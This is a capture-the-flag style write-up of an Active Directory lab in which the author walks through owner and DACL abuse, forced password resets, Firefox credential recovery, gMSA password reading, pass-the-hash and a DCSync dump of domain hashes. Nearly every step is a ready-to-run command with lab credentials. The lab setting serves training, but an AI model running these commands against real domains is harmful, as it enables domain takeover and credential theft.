Eye spy Anonymous FTP.

The rest of the open ports list is throwing very strong AD environment hints. We already know this is an AD challenge, but let's pretend for a few moments that we flew in blind.

While there are a variety of AD attack vectors, many of them require the AD domains be added to your local machine's /etc/hosts file.

Most people use nxc or the sed command to add domains to their /etc/hosts file. For whatever reason, I'm old school.

sudo nano /etc/hosts

Place the a comment followed by challenge's AD Domain and FQDN at the top of your IPv4 list :

#StellarComms
<MACHINE_IP>     DC-STELLAR.stellarcomms.local stellarcomms.local

Back to our Nmap.

We have multiple findings in the open ports and services list.

Port 21: Anonymous FTP is the first one that caught my attention. With network access via the Machine IP, we can access a directory.

Port 53: Runs DNS. This wouldn't be my first line of attack, but if most other attacks failed, DNS attacks are not out of the question.

Port 80: HTTP aka we have a web server running Microsoft IIS httpd 10.0. Duly noted for investigation.

Port 88: Kerberos is running, which can lead to some very fun attacks if other parts of the environment are not configured securely. Likely more on that later.

Ports 135, 139, and 445: SMB, which can be a great attack vector for looking at network shares.

Port 3268: LDAP, which is very useful for authentication.

RDP is also running. Great for remoting-in to a machine with tools like xfreerdp.

Enumeration

Glad we preemptively fired up Bloodhound. We can already run the collector via NetExec and retrieve the Domain information, then ingest it into Bloodhound.

The syntax for the collector uses LDAP. If you're working in the same terminal we ran the first nxc command in, just hit your up arrow key once and adjust the command:

nxc ldap DC-STELLAR.stellarcomms.local -u 'junior.analyst' -p 'Galaxy123!' --bloodhound --collection All

We hit a collector mismatch error. NetExec is configured for BloodHound CE, but my Kali setup seems to be running legacy BloodHound. The biggest clue was running bloodhound-start, then seeing the neo4j console in my terminal prior to bloodhound launching in my browser.

Change NetExec to the legacy collector only if you encounter the same situation:

cp ~/.nxc/nxc.conf ~/.nxc/nxc.conf.bak

sed -Ei \
  's/^[[:space:]]*bh_enabled[[:space:]]*=.*/bh_enabled = True/;
   s/^[[:space:]]*bhce_enabled[[:space:]]*=.*/bhce_enabled = False/' \
  ~/.nxc/nxc.conf

grep -E '^[[:space:]]*(bh_enabled|bhce_enabled)' ~/.nxc/nxc.conf

As long as we see bh_enabled = True and bhce_enabled = False, we're ready to roll:

Lateral Movement and PrivEsc

Compromising STELLAROPS-CONTROL

Our next move will be making junior.analyst the owner of STELLAROPS-CONTROL.

impacket-owneredit -action write -new-owner 'junior.analyst' -target 'stellarops-control' 'stellarcomms.local'/'junior.analyst':'Galaxy123!'

Now we need to add junior.analyst to the group. I know it seems a bit counterintuitive, but stick with me.

We'll configure this for our environment (don't miss that the -dn after -target is deleted):

impacket-dacledit -action 'write' -rights 'FullControl' -principal 'junior.analyst' -target 'stellarops-control' 'stellarcomms.local'/'junior.analyst':'Galaxy123!'

Next, we'll add junior.analyst to the stellarops-control group.

bloodyAD --host 10.1.132.28 -d stellarcomms.local -u 'junior.analyst' -p 'Galaxy123!' add groupMember STELLAROPS-CONTROL junior.analyst
net rpc group members "stellarops-control" -U 'stellarcomms.local/junior.analyst%Galaxy123!' -S 10.1.132.28

The last step we'll take to compromise OPS.CONTROLLER is leverage the ForceChangePassword permissions of STELLAROPS-CONTROL to change OPS.CONTROLLER's password via net rpc.

During real world engagements, it's proper procedure to reach out to the client once you've compromised a user at the level of OPS.CONTROLLER. More often than not, the client will create you a new user account with identical permission to OPS.CONTROLLER.

net rpc password "ops.controller" 'LetMeIn123!' -U 'stellarcomms.local/junior.analyst%Galaxy123!' -S 10.1.132.28

The command returned no output.

Let's verify via nxc:

nxc smb DC-STELLAR.stellarcomms.local -u 'ops.controller' -p 'LetMeIn123!' --shares

The OPS.CONTROLLER user is confirmed compromised. The user's password has been changed.

New Credentials: OPS.CONTROLLER:LetMeIn123!

Compromising astro.researcher

I'm going to use a tool called firepwd, which you can find on the official GitHub repo, to crack the credentials.

If you don't already have this installed on your Kali Linux machine, here's how you can install it:

git clone https://github.com/lclevy/firepwd.git
python3 -m venv .venv
.venv/bin/pip install -r firepwd/requirements.txt

I ran firepwd against the directory containing the downloaded logins.json and key4.db files:

.venv/bin/python firepwd/firepwd.py -d ~/stellar-firefox-profile/

We got the credentials for http://portal.stellarcomms.local: astro.researcher:Cosmos@42

First, we add astro.researcher to Owned, and check for Outbound Privileges.

astro.researcher has WriteDACL over eng.payload:

In the Linux Abuse category, we can leverage Impacket's dacledit to grant ourselves the GenericAll permission:

Viewing eng.payload's Outbound Privileges shows that the have ReadGMSAPassword over our one and only SATLINK-SERVICES, which allows us to retrieve the SATLINK-SERVICES password:

From SATLINK-SERVICES, we reach the DC and the end of the attack path:

Path to Domain Compromise

bloodyad -u 'astro.researcher' -p 'Cosmos@42' -d stellarcomms.local -H DC-STELLAR.stellarcomms.local add genericAll 'eng.payload' 'astro.researcher'

Success.

With GenericAll permissions over eng.payload, we can now reset their password.

bloodyad -u 'astro.researcher' -p 'Cosmos@42' -d stellarcomms.local -H DC-STELLAR.stellarcomms.local set password 'eng.payload' 'IveBeenPwned123!'

Success again.

Let's verify via nxc:

nxc smb DC-STELLAR.stellarcomms.local -u 'eng.payload' -p 'IveBeenPwned123!' --shares

Now we'll leverage eng.payload's ReadGMSAPassword capabilities over satlink-service because it's a Group Services Account.

nxc ldap DC-STELLAR.stellarcomms.local -u 'eng.payload' -p 'IveBeenPwned123!' --gmsa

Excellent news. We now have the NTLM hash for SATLINK-SERVICE.

Time to Pass-the-Hash.

nxc smb DC-STELLAR.stellarcomms.local -u 'SATLINK-SERVICE$' -H '65d3076593d2f83ee9606253049ec372' --shares

Hash = passed. We've authenticated as SATLINK-SERVICE$, giving us the ability to perform a DC Sync Attack. That effectively tells the DC that we are also the DC, gosh darn it, we need to synchronize our credentials.

Once that's done, we can pull all of the domain users' NTLM hashes. That includes the KRBTGT aka Kerberos Ticket Granting account, enabling us to forge tickets for any users we want.

nxc smb DC-STELLAR.stellarcomms.local -u 'SATLINK-SERVICE$' -H '65d3076593d2f83ee9606253049ec372' --ntds

Look at all those hashes we dumped. Including the Administrator. As long as the built-in account is enabled, we can authenticate and grab that root flag. The alternative is to decipher is one of the dumped hash accounts is usable.

nxc smb DC-STELLAR.stellarcomms.local -u 'Administrator' -H 'd3a97bfa75ebed92165ea2d67cd21002'
